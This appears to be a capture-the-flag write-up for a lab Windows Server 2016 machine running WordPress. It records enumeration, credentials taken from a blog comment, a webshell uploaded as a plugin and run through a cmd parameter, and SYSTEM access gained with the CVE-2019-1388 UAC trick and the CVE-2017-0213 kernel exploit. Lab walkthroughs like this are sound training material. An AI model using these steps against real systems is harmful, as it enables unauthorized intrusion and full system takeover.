## INFORMATION GATHERING
```bash
# IP ADDRESS
10.10.61.74
# HOSTNAME //Found Post Initial Enumeration
RETROWEB
# OPERATING SYSTEM //Found Post Initial Enumeration
OS Name:                   Microsoft Windows Server 2016 Standard
OS Version:                10.0.14393 N/A Build 14393
# CREDENTIALS  //Found Post Initial Enumeration
wade:parzival
```
## OPEN PORTS DETAILS
```bash
80/tcp   open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
3389/tcp open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
```
# ENUMERATION
## PORT 80 - HTTP
```bash
export url=http://10.10.61.74
- Found Default IIS Page

# Tools Used
sudo whatweb -v $url
sudo curl -I $url
sudo ffuf -c  -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -of md -o fuzz/ffuf-raft-large-directories -fc 403,404 -u $url/FUZZ/

# Recon
Server: Microsoft-IIS/10.0

# Fuzzing 
retro                   [Status: 200, Size: 30515, Words: 1, Lines: 1, Duration: 9422ms]

http://10.10.61.74/retro
- Found webpage about games
- Found Possible username - wade
- Found Worpress login page at page bottom
- http://10.10.61.74/retro/wp-login.php

# wpscan
sudo wpscan --url $url/retro -e
- WordPress theme in use: 90s-retro
- WordPress version 5.2.1 identified
- Found Username Wade

# More Recon 
- Checking the page contents found a comment made by user wade on post http://10.10.61.74/retro/index.php/2019/12/09/ready-player-one/
- //Comment - Leaving myself a note here just in case I forget how to spell it: parzival
- Possible creds parzival

# Trying the creds on login page http://10.10.61.74/retro/wp-login.php
wade:parzival
- Worked !!! 
```
## PORT 3389 - RDP
```bash
# Using creds able to login via RDP
wade:parzival
```

## INITIAL FOOTHOLD
```bash
# Method I - as user - nt authority\iusr
# STEPS TO GAIN COMMAND EXECUTION AND WEB SHELL  
sudo cp /usr/share/seclists/Web-Shells/WordPress/plugin-shell.php .  
sudo zip plugin-shell.zip plugin-shell.php  
Upload → http://10.10.61.74/retro/wp-admin/plugins.php → Add New → Upload Plugin → Browse → upload plugin-shell.zip → Install Now
  
PATH → wp-content/plugins/plugin-shell  
  
# COMMAND EXECUTION  
sudo curl http://10.10.61.74/retro/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=whoami
nt authority\iusr

# Method II -via RDP
sudo xfreerdp /u:wade /p:parzival /v:$ip /size:1366x768 +clipboard
```
## PRIVILEGE ESCALATION
## METHOD I
```bash
- Found Exploit details of CVE-2019-1388
- Found the Files needed for the exploit on recycle bin -> Restored the hhupd.exe and executed
- As per the exploit CVE-2019-1388 Reference https://github.com/nobodyatall648/CVE-2019-1388
- Unable to choose the default browser :(

# Seemes like the Machine is buggy sometimes - Tried again able to exploit
- After RDP on the machine followed the below steps from  https://github.com/nobodyatall648/CVE-2019-1388

1) find a program that can trigger the UAC prompt screen
2) select "Show more details"
3) select "Show information about the publisher's certificate"
4) click on the "Issued by" URL link it will prompt a browser interface.
5) wait for the site to be fully loaded & select "save as" to prompt a explorer window for "save as".
6) on the explorer window address path, enter the cmd.exe full path:
C:\WINDOWS\system32\cmd.exe
1) now you'll have an escalated privileges command prompt. 

- Worked !!!
nt authority\system
```
## METHOD II - KERNEL EXPLOIT
```bash
- As of the Windows version and Build number 
- OS Name:                   Microsoft Windows Server 2016 Standard
- OS Version:                10.0.14393 N/A Build 14393
- Tried Windows Kernel Exploit https://github.com/SecWiki/windows-kernel-exploits/blob/master/CVE-2017-0213/CVE-2017-0213_x64.zip

C:\Users\Wade\Desktop>CVE-2017-0213_x64.exe
- Kernel Exploit Worked

nt authority\system
```
# ENUMERATION OUTPUTS
## NMAP
```bash
# Nmap 7.95 scan initiated Sun Feb 23 21:36:04 2025 as: /usr/lib/nmap/nmap -p 80,3389 -Pn -sC -sV -vv -oN nmap/scan-script-version 10.10.61.74
Nmap scan report for 10.10.61.74
Host is up, received user-set (0.24s latency).
Scanned at 2025-02-23 21:36:06 IST for 15s

PORT     STATE SERVICE       REASON          VERSION
80/tcp   open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
3389/tcp open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
| ssl-cert: Subject: commonName=RetroWeb
| Issuer: commonName=RetroWeb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-02-22T16:00:28
| Not valid after:  2025-08-24T16:00:28
| MD5:   3965:311e:ed4f:4dd2:e807:4d98:9c05:c74e
| SHA-1: e308:76fa:4c58:05f2:c11b:7ebe:5961:c196:5ecd:b50a
| -----BEGIN CERTIFICATE-----
| MIIC1DCCAbygAwIBAgIQcLjldGqzA5lLd9sdvKRMGjANBgkqhkiG9w0BAQsFADAT
| MREwDwYDVQQDEwhSZXRyb1dlYjAeFw0yNTAyMjIxNjAwMjhaFw0yNTA4MjQxNjAw
| MjhaMBMxETAPBgNVBAMTCFJldHJvV2ViMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A
| MIIBCgKCAQEAsQOJJ+Ypx46qU/9tj4kah0tJXnWM0xwL3at5Jsp5pVi62Bc/V2Ib
| B1HSO2O0FqtTuPM/LG90nlouTJtYcepaNpBYDm2UbOheZ6URYZtITqRXAv4uq9m/
| rsmhSFQvGteb3Ub/eENPQIXqrigx46/YeV3avt2T+qfYqF4q5sFbeHEiAhENyQ4Q
| uQLkyvMSo6xz2ST2tHdzByQz4J/+f82ISiavd7JRNB5n9qKhrGJ/elKWm0Czim8j
| b1kbSD0E6GBMIyinOHAzg4Pm7jnvC0ei3xQ4VkbdtDQe6gCgJDaa47h6O4AHyxQT
| XFeYxz+niR8IfHdq6bJlvRTOWfry2/aBIQIDAQABoyQwIjATBgNVHSUEDDAKBggr
| BgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQELBQADggEBAC5QpM7le39A
| Kf8ss91s+/a7Xlq3bROn6f66wDQNF7lpz1eYAKcNSiHMslIO3qDHAavHfBvS4dtx
| 5HI6mx+/U0it7mltRgzUrIhucvaxAYF11Bvmz0bwTgHXlbtt5AD7NFVd1OiHnWh2
| 6FYWAIVYQnwHl1vkP/lHgHDXvPDJ2dL8bN4/S29+8ZtZnttZ+zkAbI9B9TrG9jhX
| ZlA82wCqpllUCfSvkjpRNzdC5EoCPvE2BF827KWq3zvMema7+1hJDfWczH2Ig9pL
| vIHPwlD+WVAmyP8BoISVxZxmERFZCztOBGE8IArHT8l/qeXsU8c7yZuclYsJ3oXA
| rwIv2PX/RBk=
|_-----END CERTIFICATE-----
| rdp-ntlm-info: 
|   Target_Name: RETROWEB
|   NetBIOS_Domain_Name: RETROWEB
|   NetBIOS_Computer_Name: RETROWEB
|   DNS_Domain_Name: RetroWeb
|   DNS_Computer_Name: RetroWeb
|   Product_Version: 10.0.14393
|_  System_Time: 2025-02-23T16:06:16+00:00
|_ssl-date: 2025-02-23T16:06:21+00:00; +1s from scanner time.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 0s, deviation: 0s, median: 0s

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Feb 23 21:36:21 2025 -- 1 IP address (1 host up) scanned in 16.81 seconds
```

